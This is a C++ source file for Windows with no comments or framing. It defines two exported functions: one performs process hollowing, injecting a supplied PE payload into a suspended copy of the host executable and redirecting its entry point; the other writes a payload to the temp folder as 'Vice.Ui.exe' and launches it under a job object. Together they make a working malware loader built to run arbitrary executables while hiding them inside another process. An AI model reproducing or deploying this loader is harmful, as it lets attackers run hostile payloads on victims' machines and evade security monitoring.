#include <windows.h>
#include <stdio.h>
#include <fstream>
#include <iostream>
#include <vector>

extern "C" {
    int hollow_process(const unsigned char* payload) {
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        char szPath[MAX_PATH];
        GetModuleFileNameA(NULL, szPath, MAX_PATH);

        if (!CreateProcessA(NULL, szPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            std::cerr << "Failed to spawn process\n";
            return -1;
        }

        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
        PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(payload + dosHeader->e_lfanew);
        
        LPVOID remoteMem = VirtualAllocEx(pi.hProcess, (LPVOID)ntHeaders->OptionalHeader.ImageBase, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        
        if (!remoteMem) {
            TerminateProcess(pi.hProcess, 0);
            std::cerr << "Failed to alloc memory\n";
            return -1;
        }

        WriteProcessMemory(pi.hProcess, remoteMem, payload, ntHeaders->OptionalHeader.SizeOfHeaders, NULL);
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            LPVOID dest = (LPVOID)((size_t)remoteMem + section[i].VirtualAddress);
            LPVOID src = (LPVOID)((size_t)payload + section[i].PointerToRawData);
            WriteProcessMemory(pi.hProcess, dest, src, section[i].SizeOfRawData, NULL);
        }

        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_ALL;
        GetThreadContext(pi.hThread, &ctx);

        WriteProcessMemory(pi.hProcess, (LPVOID)(ctx.Rdx + 0x10), &remoteMem, sizeof(LPVOID), NULL);

        ctx.Rip = (DWORD64)remoteMem + ntHeaders->OptionalHeader.AddressOfEntryPoint;
        ctx.Rcx = ctx.Rip; 

        SetThreadContext(pi.hThread, &ctx);

        if (ResumeThread(pi.hThread) == (DWORD)-1) {
            TerminateProcess(pi.hProcess, 0);
        }

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        return 0;
    }

    void run_in_job(const unsigned char* payload, size_t payload_size) {
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);

        std::string exePath = std::string(tempPath) + "Vice.Ui.exe";

        std::ofstream file(exePath, std::ios::binary);
        file.write(reinterpret_cast<const char*>(payload), payload_size);
        file.close();

        HANDLE job = CreateJobObjectW(NULL, NULL);

        JOBOBJECT_EXTENDED_LIMIT_INFORMATION info;
        info.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;

        SetInformationJobObject(
            job,
            JobObjectExtendedLimitInformation,
            &info,
            sizeof(JOBOBJECT_EXTENDED_LIMIT_INFORMATION)
        );

        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };

        si.dwFlags |= STARTF_USESTDHANDLES;
        si.hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
        si.hStdError = GetStdHandle(STD_ERROR_HANDLE);
        si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

        std::wstring exePathW(exePath.begin(), exePath.end());
        std::vector<wchar_t> cmd(exePathW.begin(), exePathW.end());
        cmd.push_back(L'\0');

        if (!CreateProcessW(NULL, cmd.data(), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            std::cerr << "Failed to spawn process\n";
            return;
        }

        AssignProcessToJobObject(job, pi.hProcess);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}